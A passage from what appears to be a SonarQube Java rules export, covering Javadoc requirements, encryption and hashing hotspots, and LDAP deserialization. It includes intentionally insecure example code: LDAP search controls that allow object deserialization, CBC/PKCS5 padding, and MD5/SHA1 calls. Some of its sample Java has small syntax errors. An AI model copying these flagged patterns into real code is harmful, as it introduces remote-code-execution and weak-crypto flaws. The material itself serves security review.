  <li> At least 1 line of description. </li>
  <li> All parameters documented with <code>@param</code>, and names should match. </li>
  <li> All checked exceptions documented with <code>@throws</code> </li>
  <li> <code>@return</code> present and documented when not <code>void</code>. </li>
  <li> Placeholders like ""TODO"", ""FIXME"", ""..."" should be avoided. </li>
</ul>
<p>The following public methods and constructors are not taken into account by this rule:</p>
<ul>
  <li> Getters and setters. </li>
  <li> Methods overriding another method (usually decorated with <code>@Override</code>). </li>
  <li> Empty constructors. </li>
  <li> Static constants. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
/**
  * This is a Javadoc comment
  */
public class MyClass&lt;T&gt; implements Runnable {    // Noncompliant - missing '@param &lt;T&gt;'

  public static final DEFAULT_STATUS = 0;    // Compliant - static constant
  private int status;                           // Compliant - not public

  public String message;                  // Noncompliant

  public MyClass() {                         // Noncompliant - missing documentation
    this.status = DEFAULT_STATUS;
  }

  public void setStatus(int status) {  // Compliant - setter
    this.status = status;
  }

  @Override
  public void run() {                          // Compliant - has @Override annotation
  }

  protected void doSomething() {    // Compliant - not public
  }

  public void doSomething2(int value) {  // Noncompliant
  }

  public int doSomething3(int value) {  // Noncompliant
    return value;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
/**
  * This is a Javadoc comment
  * @param &lt;T&gt; the parameter of the class
  */
public class MyClass&lt;T&gt; implements Runnable {

  public static final DEFAULT_STATUS = 0;
  private int status;

  /**
    * This is a Javadoc comment
    */
  public String message;

  /**
   * Class comment...
   */
  public MyClass() {
    this.status = DEFAULT_STATUS;
  }

  public void setStatus(int status) {
    this.status = status;
  }

  @Override
  public void run() {
  }

  protected void doSomething() {
  }

  /**
    * Will do something.
    * @param value the value to be used
    */
  public void doSomething(int value) {

  /**
    *  {@inheritDoc}
    */
  public int doSomething(int value) {
    return value;
  }
}
</pre>",squid:UndocumentedApi,java,Java,"<p>Try to imagine using the standard Java API (Collections, JDBC, IO, ...) without Javadoc. It would be a nightmare, because Javadoc is the only way
to understand of the contract of the API. Documenting an API with Javadoc increases the productivity of the developers consuming it.</p>
<p>On top of a main description for each member of a public API, the following Javadoc elements are required to be described:</p>
<ul>
  <li> Parameters, using <code>@param parameterName</code>. </li>
  <li> Thrown exceptions, using <code>@throws exceptionName</code>. </li>
  <li> Method return values, using <code>@return</code>. </li>
  <li> Generic types, using <code>@param &lt;T&gt;</code>. </li>
</ul>
<p>Furthermore the following guidelines should be followed:</p>
<ul>
  <li> At least 1 line of description. </li>
  <li> All parameters documented with <code>@param</code>, and names should match. </li>
  <li> All checked exceptions documented with <code>@throws</code> </li>
  <li> <code>@return</code> present and documented when not <code>void</code>. </li>
  <li> Placeholders like ""TODO"", ""FIXME"", ""..."" should be avoided. </li>
</ul>
<p>The following public methods and constructors are not taken into account by this rule:</p>
<ul>
  <li> Getters and setters. </li>
  <li> Methods overriding another method (usually decorated with <code>@Override</code>). </li>
  <li> Empty constructors. </li>
  <li> Static constants. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
/**
  * This is a Javadoc comment
  */
public class MyClass&lt;T&gt; implements Runnable {    // Noncompliant - missing '@param &lt;T&gt;'

  public static final DEFAULT_STATUS = 0;    // Compliant - static constant
  private int status;                           // Compliant - not public

  public String message;                  // Noncompliant

  public MyClass() {                         // Noncompliant - missing documentation
    this.status = DEFAULT_STATUS;
  }

  public void setStatus(int status) {  // Compliant - setter
    this.status = status;
  }

  @Override
  public void run() {                          // Compliant - has @Override annotation
  }

  protected void doSomething() {    // Compliant - not public
  }

  public void doSomething2(int value) {  // Noncompliant
  }

  public int doSomething3(int value) {  // Noncompliant
    return value;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
/**
  * This is a Javadoc comment
  * @param &lt;T&gt; the parameter of the class
  */
public class MyClass&lt;T&gt; implements Runnable {

  public static final DEFAULT_STATUS = 0;
  private int status;

  /**
    * This is a Javadoc comment
    */
  public String message;

  /**
   * Class comment...
   */
  public MyClass() {
    this.status = DEFAULT_STATUS;
  }

  public void setStatus(int status) {
    this.status = status;
  }

  @Override
  public void run() {
  }

  protected void doSomething() {
  }

  /**
    * Will do something.
    * @param value the value to be used
    */
  public void doSomething(int value) {

  /**
    *  {@inheritDoc}
    */
  public int doSomething(int value) {
    return value;
  }
}
</pre>","Public types, methods and fields (API) should be documented with Javadoc","[{'key': 'forClasses', 'htmlDesc': 'Pattern of classes which should adhere to this constraint. Ex : *<strong>.api.</strong>*', 'defaultValue': '**.api.**', 'type': 'STRING'}, {'key': 'exclusion', 'htmlDesc': 'Pattern of classes which are excluded from adhering to this constraint.', 'defaultValue': '**.internal.**', 'type': 'STRING'}]",MAJOR,['convention'],CODE_SMELL
2018-11-12T11:11:26+0100,"<p>Encrypting data is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7902"">CVE-2017-7902</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-1378"">CVE-2006-1378</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1376"">CVE-2003-1376</a> </li>
</ul>
<p>Proper encryption requires both the encryption algorithm and the key to be strong. Obviously the private key needs to remain secret and be renewed
regularly. However these are not the only means to defeat or weaken an encryption.</p>
<p> </p>
<p>This rule flags function calls that initiate encryption/decryption. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the private key might not be random, strong enough or the same key is reused for a long long time. </li>
  <li> the private key might be compromised. It can happen when it is stored in an unsafe place or when it was transferred in an unsafe manner. </li>
  <li> the key exchange is made without properly authenticating the receiver. </li>
  <li> the encryption algorithm is not strong enough for the level of protection required. Note that encryption algorithms strength decreases as time
  passes. </li>
  <li> the chosen encryption library is deemed unsafe. </li>
  <li> a nonce is used, and the same value is reused multiple times, or the nonce is not random. </li>
  <li> the RSA algorithm is used, and it does not incorporate an Optimal Asymmetric Encryption Padding (OAEP), which might weaken the encryption.
  </li>
  <li> the CBC (Cypher Block Chaining) algorithm is used for encryption, and it's IV (Initialization Vector) is not generated using a secure random
  algorithm, or it is reused. </li>
  <li> the Advanced Encryption Standard (AES) encryption algorithm is used with an unsecure mode. See the recommended practices for more information.
  </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Generate encryption keys using secure random algorithms. </li>
  <li> When generating cryptographic keys (or key pairs), it is important to use a key length that provides enough entropy against brute-force
  attacks. For the Blowfish algorithm the key should be at least 128 bits long, while for the RSA algorithm it should be at least 2048 bits long.
  </li>
  <li> Regenerate the keys regularly. </li>
  <li> Always store the keys in a safe location and transfer them only over safe channels. </li>
  <li> If there is an exchange of cryptographic keys, check first the identity of the receiver. </li>
  <li> Only use strong encryption algorithms. Check regularly that the algorithm is still deemed secure. It is also imperative that they are
  implemented correctly. Use only encryption libraries which are deemed secure. Do not define your own encryption algorithms as they will most
  probably have flaws. </li>
  <li> When a nonce is used, generate it randomly every time. </li>
  <li> When using the RSA algorithm, incorporate an Optimal Asymmetric Encryption Padding (OAEP). </li>
  <li> When CBC is used for encryption, the IV must be random and unpredictable. Otherwise it exposes the encrypted value to crypto-analysis attacks
  like ""Chosen-Plaintext Attacks"". Thus a secure random algorithm should be used. An IV value should be associated to one and only one encryption
  cycle, because the IV's purpose is to ensure that the same plaintext encrypted twice will yield two different ciphertexts. </li>
  <li> The Advanced Encryption Standard (AES) encryption algorithm can be used with various modes. Galois/Counter Mode (GCM) with no padding should be
  preferred to the following combinations which are not secured:
    <ul>
      <li> Electronic Codebook (ECB) mode: Under a given key, any given plaintext block always gets encrypted to the same ciphertext block. Thus, it
      does not hide data patterns well. In some senses, it doesn't provide serious message confidentiality, and it is not recommended for use in
      cryptographic protocols at all. </li>
      <li> Cipher Block Chaining (CBC) with PKCS#5 padding (or PKCS#7) is susceptible to padding oracle attacks. </li>
    </ul> </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
// === javax.crypto ===
import javax.crypto.Cipher;
Cipher c = Cipher.getInstance(...);  // Questionable

// === apache.commons.crypto ===
import java.util.Properties;
import org.apache.commons.crypto.utils.Utils;
import org.apache.commons.crypto.cipher.CryptoCipherFactory;
import org.apache.commons.crypto.cipher.CryptoCipherFactory.CipherProvider;

Properties properties = new Properties();
properties.setProperty(CryptoCipherFactory.CLASSES_KEY, CipherProvider.OPENSSL.getClassName());
final String transform = ""AES/CBC/PKCS5Padding"";
Utils.getCipherInstance(transform, properties);  // Questionable
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/321.html"">MITRE, CWE-321</a> - Use of Hard-coded Cryptographic Key </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/322.html"">MITRE, CWE-322</a> - Key Exchange without Entity Authentication </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/323.html"">MITRE, CWE-323</a> - Reusing a Nonce, Key Pair in Encryption </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/324.html"">MITRE, CWE-324</a> - Use of a Key Past its Expiration Date </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/325.html"">MITRE, CWE-325</a> - Missing Required Cryptographic Step </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/326.html"">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/327.html"">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/522.html"">MITRE, CWE-522</a> - Insufficiently Protected Credentials </li>
  <li> [OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> [OWASP Top 10 2017 Category A6 - Security Misconfiguration </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",squid:S4787,java,Java,"<p>Encrypting data is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7902"">CVE-2017-7902</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-1378"">CVE-2006-1378</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1376"">CVE-2003-1376</a> </li>
</ul>
<p>Proper encryption requires both the encryption algorithm and the key to be strong. Obviously the private key needs to remain secret and be renewed
regularly. However these are not the only means to defeat or weaken an encryption.</p>
<p> </p>
<p>This rule flags function calls that initiate encryption/decryption. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the private key might not be random, strong enough or the same key is reused for a long long time. </li>
  <li> the private key might be compromised. It can happen when it is stored in an unsafe place or when it was transferred in an unsafe manner. </li>
  <li> the key exchange is made without properly authenticating the receiver. </li>
  <li> the encryption algorithm is not strong enough for the level of protection required. Note that encryption algorithms strength decreases as time
  passes. </li>
  <li> the chosen encryption library is deemed unsafe. </li>
  <li> a nonce is used, and the same value is reused multiple times, or the nonce is not random. </li>
  <li> the RSA algorithm is used, and it does not incorporate an Optimal Asymmetric Encryption Padding (OAEP), which might weaken the encryption.
  </li>
  <li> the CBC (Cypher Block Chaining) algorithm is used for encryption, and it's IV (Initialization Vector) is not generated using a secure random
  algorithm, or it is reused. </li>
  <li> the Advanced Encryption Standard (AES) encryption algorithm is used with an unsecure mode. See the recommended practices for more information.
  </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Generate encryption keys using secure random algorithms. </li>
  <li> When generating cryptographic keys (or key pairs), it is important to use a key length that provides enough entropy against brute-force
  attacks. For the Blowfish algorithm the key should be at least 128 bits long, while for the RSA algorithm it should be at least 2048 bits long.
  </li>
  <li> Regenerate the keys regularly. </li>
  <li> Always store the keys in a safe location and transfer them only over safe channels. </li>
  <li> If there is an exchange of cryptographic keys, check first the identity of the receiver. </li>
  <li> Only use strong encryption algorithms. Check regularly that the algorithm is still deemed secure. It is also imperative that they are
  implemented correctly. Use only encryption libraries which are deemed secure. Do not define your own encryption algorithms as they will most
  probably have flaws. </li>
  <li> When a nonce is used, generate it randomly every time. </li>
  <li> When using the RSA algorithm, incorporate an Optimal Asymmetric Encryption Padding (OAEP). </li>
  <li> When CBC is used for encryption, the IV must be random and unpredictable. Otherwise it exposes the encrypted value to crypto-analysis attacks
  like ""Chosen-Plaintext Attacks"". Thus a secure random algorithm should be used. An IV value should be associated to one and only one encryption
  cycle, because the IV's purpose is to ensure that the same plaintext encrypted twice will yield two different ciphertexts. </li>
  <li> The Advanced Encryption Standard (AES) encryption algorithm can be used with various modes. Galois/Counter Mode (GCM) with no padding should be
  preferred to the following combinations which are not secured:
    <ul>
      <li> Electronic Codebook (ECB) mode: Under a given key, any given plaintext block always gets encrypted to the same ciphertext block. Thus, it
      does not hide data patterns well. In some senses, it doesn't provide serious message confidentiality, and it is not recommended for use in
      cryptographic protocols at all. </li>
      <li> Cipher Block Chaining (CBC) with PKCS#5 padding (or PKCS#7) is susceptible to padding oracle attacks. </li>
    </ul> </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
// === javax.crypto ===
import javax.crypto.Cipher;
Cipher c = Cipher.getInstance(...);  // Questionable

// === apache.commons.crypto ===
import java.util.Properties;
import org.apache.commons.crypto.utils.Utils;
import org.apache.commons.crypto.cipher.CryptoCipherFactory;
import org.apache.commons.crypto.cipher.CryptoCipherFactory.CipherProvider;

Properties properties = new Properties();
properties.setProperty(CryptoCipherFactory.CLASSES_KEY, CipherProvider.OPENSSL.getClassName());
final String transform = ""AES/CBC/PKCS5Padding"";
Utils.getCipherInstance(transform, properties);  // Questionable
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/321.html"">MITRE, CWE-321</a> - Use of Hard-coded Cryptographic Key </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/322.html"">MITRE, CWE-322</a> - Key Exchange without Entity Authentication </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/323.html"">MITRE, CWE-323</a> - Reusing a Nonce, Key Pair in Encryption </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/324.html"">MITRE, CWE-324</a> - Use of a Key Past its Expiration Date </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/325.html"">MITRE, CWE-325</a> - Missing Required Cryptographic Step </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/326.html"">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/327.html"">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/522.html"">MITRE, CWE-522</a> - Insufficiently Protected Credentials </li>
  <li> [OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> [OWASP Top 10 2017 Category A6 - Security Misconfiguration </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",Encrypting data is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a3', 'owasp-a6', 'sans-top25-porous']",SECURITY_HOTSPOT
2018-06-07T12:32:41+0200,"<p>JNDI supports the deserialization of objects from LDAP directories, which is fundamentally insecure and can lead to remote code execution.</p>
<p>This rule raises an issue when an LDAP search query is executed with <code>SearchControls</code> configured to allow deserialization.</p>
<h2>Noncompliant Code Example</h2>
<pre>
DirContext ctx = new InitialDirContext();
// ...
ctx.search(query, filter,
        new SearchControls(scope, countLimit, timeLimit, attributes,
            true, // Noncompliant; allows deserialization
            deref));
</pre>
<h2>Compliant Solution</h2>
<pre>
DirContext ctx = new InitialDirContext();
// ...
ctx.search(query, filter,
        new SearchControls(scope, countLimit, timeLimit, attributes,
            false,
            deref));
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/502.html"">MITRE, CWE-502</a> - Deserialization of Untrusted Data </li>
  <li> OWASP Top 10 2017 Category A8 - Insecure Deserialization </li>
  <li> <a href=""https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf"">BlackHat
  presentation</a> </li>
  <li> Derived from FindSecBugs rule <a href=""https://find-sec-bugs.github.io/bugs.htm#LDAP_ENTRY_POISONING"">LDAP_ENTRY_POISONING</a> </li>
</ul>",squid:S4434,java,Java,"<p>JNDI supports the deserialization of objects from LDAP directories, which is fundamentally insecure and can lead to remote code execution.</p>
<p>This rule raises an issue when an LDAP search query is executed with <code>SearchControls</code> configured to allow deserialization.</p>
<h2>Noncompliant Code Example</h2>
<pre>
DirContext ctx = new InitialDirContext();
// ...
ctx.search(query, filter,
        new SearchControls(scope, countLimit, timeLimit, attributes,
            true, // Noncompliant; allows deserialization
            deref));
</pre>
<h2>Compliant Solution</h2>
<pre>
DirContext ctx = new InitialDirContext();
// ...
ctx.search(query, filter,
        new SearchControls(scope, countLimit, timeLimit, attributes,
            false,
            deref));
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/502.html"">MITRE, CWE-502</a> - Deserialization of Untrusted Data </li>
  <li> OWASP Top 10 2017 Category A8 - Insecure Deserialization </li>
  <li> <a href=""https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf"">BlackHat
  presentation</a> </li>
  <li> Derived from FindSecBugs rule <a href=""https://find-sec-bugs.github.io/bugs.htm#LDAP_ENTRY_POISONING"">LDAP_ENTRY_POISONING</a> </li>
</ul>",LDAP deserialization should be disabled,[],BLOCKER,"['cwe', 'owasp-a8']",VULNERABILITY
2018-11-12T11:11:26+0100,"<p>Hashing data is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9233"">CVE-2018-9233</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-5097"">CVE-2013-5097</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1051"">CVE-2007-1051</a> </li>
</ul>
<p>Cryptographic hash functions are used to uniquely identify information without storing their original form. When not done properly, an attacker can
steal the original information by guessing it (ex: with a <a href=""https://en.wikipedia.org/wiki/Rainbow_table"">rainbow table</a>), or replace the
original data with another one having the same hash.</p>
<p>This rule flags code that initiates hashing.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the hashed value is used in a security context. </li>
  <li> the hashing algorithm you are using is known to have vulnerabilities. </li>
  <li> <a href=""https://en.wikipedia.org/wiki/Salt_(cryptography)"">salts</a> are not automatically generated and applied by the hashing function.
  </li>
  <li> any generated salts are cryptographically weak or not credential-specific. </li>
</ul>
<p>You are at risk if you answered yes to the first question and any of the following ones.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> for security related purposes, use only hashing algorithms which are <a
  href=""https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet"">currently known to be strong</a>. Avoid using algorithms like MD5 and SHA1
  completely in security contexts. </li>
  <li> do not define your own hashing- or salt algorithms as they will most probably have flaws. </li>
  <li> do not use algorithms that compute too quickly, like SHA256, as it must remain beyond modern hardware capabilities to perform brute force and
  dictionary based attacks. </li>
  <li> use a hashing algorithm that generate its own salts as part of the hashing. If you generate your own salts, make sure that a cryptographically
  strong salt algorithm is used, that generated salts are credential-specific, and finally, that the salt is applied correctly before the hashing.
  </li>
  <li> save both the salt and the hashed value in the relevant database record; during future validation operations, the salt and hash can then be
  retrieved from the database. The hash is recalculated with the stored salt and the value being validated, and the result compared to the stored
  hash. </li>
  <li> the strength of hashing algorithms often decreases over time as hardware capabilities increase. Check regularly that the algorithms you are
  using are still considered secure. If needed, rehash your data using a stronger algorithm. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
// === MessageDigest ===
import java.security.MessageDigest;
import java.security.Provider;

class A {
    void foo(String algorithm, String providerStr, Provider provider) throws Exception {
        MessageDigest.getInstance(algorithm); // Questionable
        MessageDigest.getInstance(algorithm, providerStr); // Questionable
        MessageDigest.getInstance(algorithm, provider); // Questionable
    }
}
</pre>
<p>Regarding <code>SecretKeyFactory</code>. Any call to <code>SecretKeyFactory.getInstance(""..."")</code> with an argument starting by
<code>""PBKDF2""</code> will be highlighted. See <a href=""https://www.owasp.org/index.php/Hashing_Java"">OWASP guidelines</a>, list of <a
href=""https://docs.oracle.com/javase/7/docs/technotes/guides/security/StandardNames.html#SecretKeyFactory"">standard algorithms</a> and <a
href=""https://developer.android.com/reference/javax/crypto/SecretKeyFactory"">algorithms on android</a>.</p>
<pre>
// === javax.crypto ===
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.SecretKeyFactory;

class A {
    void foo(char[] password, byte[] salt, int iterationCount, int keyLength) throws Exception {
        // Questionable. Review this, even if it is the way recommended by OWASP
        SecretKeyFactory factory = SecretKeyFactory.getInstance(""PBKDF2WithHmacSHA512"");
        PBEKeySpec spec = new PBEKeySpec(password, salt, iterationCount, keyLength);
        factory.generateSecret(spec).getEncoded();
    }
}
</pre>
<p>Regarding Guava, only the hashing functions which are usually misused for sensitive data will raise an issue, i.e. <code>md5</code> and
<code>sha*</code>.</p>
<pre>
// === Guava ===
import com.google.common.hash.Hashing;

class A {
    void foo() {
        Hashing.md5(); // Questionable
        Hashing.sha1(); // Questionable
        Hashing.sha256(); // Questionable
        Hashing.sha384(); // Questionable
        Hashing.sha512(); // Questionable
    }
}
</pre>
<pre>
// === org.apache.commons ===
import org.apache.commons.codec.digest.DigestUtils;

class A {
    void foo(String strName, byte[] data, String str, java.io.InputStream stream) throws Exception {
        new DigestUtils(strName); // Questionable
        new DigestUtils(); // Questionable

        DigestUtils.getMd2Digest(); // Questionable
        DigestUtils.getMd5Digest(); // Questionable
        DigestUtils.getShaDigest(); // Questionable
        DigestUtils.getSha1Digest(); // Questionable
        DigestUtils.getSha256Digest(); // Questionable
        DigestUtils.getSha384Digest(); // Questionable
        DigestUtils.getSha512Digest(); // Questionable


        DigestUtils.md2(data); // Questionable
        DigestUtils.md2(stream); // Questionable
        DigestUtils.md2(str); // Questionable
        DigestUtils.md2Hex(data); // Questionable
        DigestUtils.md2Hex(stream); // Questionable
        DigestUtils.md2Hex(str); // Questionable

        DigestUtils.md5(data); // Questionable
        DigestUtils.md5(stream); // Questionable
        DigestUtils.md5(str); // Questionable
        DigestUtils.md5Hex(data); // Questionable
        DigestUtils.md5Hex(stream); // Questionable
        DigestUtils.md5Hex(str); // Questionable

        DigestUtils.sha(data); // Questionable
        DigestUtils.sha(stream); // Questionable
        DigestUtils.sha(str); // Questionable
        DigestUtils.shaHex(data); // Questionable
        DigestUtils.shaHex(stream); // Questionable
        DigestUtils.shaHex(str); // Questionable

        DigestUtils.sha1(data); // Questionable
        DigestUtils.sha1(stream); // Questionable
        DigestUtils.sha1(str); // Questionable
        DigestUtils.sha1Hex(data); // Questionable
        DigestUtils.sha1Hex(stream); // Questionable
        DigestUtils.sha1Hex(str); // Questionable

        DigestUtils.sha256(data); // Questionable
        DigestUtils.sha256(stream); // Questionable
        DigestUtils.sha256(str); // Questionable
        DigestUtils.sha256Hex(data); // Questionable
        DigestUtils.sha256Hex(stream); // Questionable
        DigestUtils.sha256Hex(str); // Questionable

        DigestUtils.sha384(data); // Questionable
        DigestUtils.sha384(stream); // Questionable
        DigestUtils.sha384(str); // Questionable
        DigestUtils.sha384Hex(data); // Questionable
        DigestUtils.sha384Hex(stream); // Questionable
        DigestUtils.sha384Hex(str); // Questionable

        DigestUtils.sha512(data); // Questionable
        DigestUtils.sha512(stream); // Questionable
        DigestUtils.sha512(str); // Questionable
        DigestUtils.sha512Hex(data); // Questionable
        DigestUtils.sha512Hex(stream); // Questionable
        DigestUtils.sha512Hex(str); // Questionable
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/916.html"">MITRE, CWE-916</a> - Use of Password Hash With Insufficient Computational Effort
  </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/759.html"">MITRE, CWE-759</a> - Use of a One-Way Hash without a Salt </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/760.html"">MITRE, CWE-760</a> - Use of a One-Way Hash with a Predictable Salt </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",squid:S4790,java,Java,"<p>Hashing data is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9233"">CVE-2018-9233</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-5097"">CVE-2013-5097</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1051"">CVE-2007-1051</a> </li>
</ul>
<p>Cryptographic hash functions are used to uniquely identify information without storing their original form. When not done properly, an attacker can
steal the original information by guessing it (ex: with a <a href=""https://en.wikipedia.org/wiki/Rainbow_table"">rainbow table</a>), or replace the
original data with another one having the same hash.</p>
<p>This rule flags code that initiates hashing.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the hashed value is used in a security context. </li>
  <li> the hashing algorithm you are using is known to have vulnerabilities. </li>
  <li> <a href=""https://en.wikipedia.org/wiki/Salt_(cryptography)"">salts</a> are not automatically generated and applied by the hashing function.
  </li>
  <li> any generated salts are cryptographically weak or not credential-specific. </li>
</ul>
<p>You are at risk if you answered yes to the first question and any of the following ones.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> for security related purposes, use only hashing algorithms which are <a
  href=""https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet"">currently known to be strong</a>. Avoid using algorithms like MD5 and SHA1
  completely in security contexts. </li>
  <li> do not define your own hashing- or salt algorithms as they will most probably have flaws. </li>
  <li> do not use algorithms that compute too quickly, like SHA256, as it must remain beyond modern hardware capabilities to perform brute force and
  dictionary based attacks. </li>
  <li> use a hashing algorithm that generate its own salts as part of the hashing. If you generate your own salts, make sure that a cryptographically
  strong salt algorithm is used, that generated salts are credential-specific, and finally, that the salt is applied correctly before the hashing.
  </li>
  <li> save both the salt and the hashed value in the relevant database record; during future validation operations, the salt and hash can then be
  retrieved from the database. The hash is recalculated with the stored salt and the value being validated, and the result compared to the stored
  hash. </li>
  <li> the strength of hashing algorithms often decreases over time as hardware capabilities increase. Check regularly that the algorithms you are
  using are still considered secure. If needed, rehash your data using a stronger algorithm. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
// === MessageDigest ===
import java.security.MessageDigest;
import java.security.Provider;

class A {
    void foo(String algorithm, String providerStr, Provider provider) throws Exception {
        MessageDigest.getInstance(algorithm); // Questionable
        MessageDigest.getInstance(algorithm, providerStr); // Questionable
        MessageDigest.getInstance(algorithm, provider); // Questionable
    }
}
</pre>
<p>Regarding <code>SecretKeyFactory</code>. Any call to <code>SecretKeyFactory.getInstance(""..."")</code> with an argument starting by
<code>""PBKDF2""</code> will be highlighted. See <a href=""https://www.owasp.org/index.php/Hashing_Java"">OWASP guidelines</a>, list of <a
href=""https://docs.oracle.com/javase/7/docs/technotes/guides/security/StandardNames.html#SecretKeyFactory"">standard algorithms</a> and <a
href=""https://developer.android.com/reference/javax/crypto/SecretKeyFactory"">algorithms on android</a>.</p>
<pre>
// === javax.crypto ===
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.SecretKeyFactory;

class A {
    void foo(char[] password, byte[] salt, int iterationCount, int keyLength) throws Exception {
        // Questionable. Review this, even if it is the way recommended by OWASP
        SecretKeyFactory factory = SecretKeyFactory.getInstance(""PBKDF2WithHmacSHA512"");
        PBEKeySpec spec = new PBEKeySpec(password, salt, iterationCount, keyLength);
        factory.generateSecret(spec).getEncoded();
    }
}
</pre>
<p>Regarding Guava, only the hashing functions which are usually misused for sensitive data will raise an issue, i.e. <code>md5</code> and
<code>sha*</code>.</p>
<pre>
// === Guava ===
import com.google.common.hash.Hashing;

class A {
    void foo() {
        Hashing.md5(); // Questionable
        Hashing.sha1(); // Questionable
        Hashing.sha256(); // Questionable
        Hashing.sha384(); // Questionable
        Hashing.sha512(); // Questionable
    }
}
</pre>
<pre>
// === org.apache.commons ===
import org.apache.commons.codec.digest.DigestUtils;

class A {
    void foo(String strName, byte[] data, String str, java.io.InputStream stream) throws Exception {
        new DigestUtils(strName); // Questionable
        new DigestUtils(); // Questionable

        DigestUtils.getMd2Digest(); // Questionable
        DigestUtils.getMd5Digest(); // Questionable
        DigestUtils.getShaDigest(); // Questionable
        DigestUtils.getSha1Digest(); // Questionable
        DigestUtils.getSha256Digest(); // Questionable
        DigestUtils.getSha384Digest(); // Questionable
        DigestUtils.getSha512Digest(); // Questionable


        DigestUtils.md2(data); // Questionable
        DigestUtils.md2(stream); // Questionable
        DigestUtils.md2(str); // Questionable
        DigestUtils.md2Hex(data); // Questionable
        DigestUtils.md2Hex(stream); // Questionable
        DigestUtils.md2Hex(str); // Questionable

        DigestUtils.md5(data); // Questionable
        DigestUtils.md5(stream); // Questionable
        DigestUtils.md5(str); // Questionable
        DigestUtils.md5Hex(data); // Questionable
        DigestUtils.md5Hex(stream); // Questionable
        DigestUtils.md5Hex(str); // Questionable

        DigestUtils.sha(data); // Questionable
        DigestUtils.sha(stream); // Questionable
        DigestUtils.sha(str); // Questionable
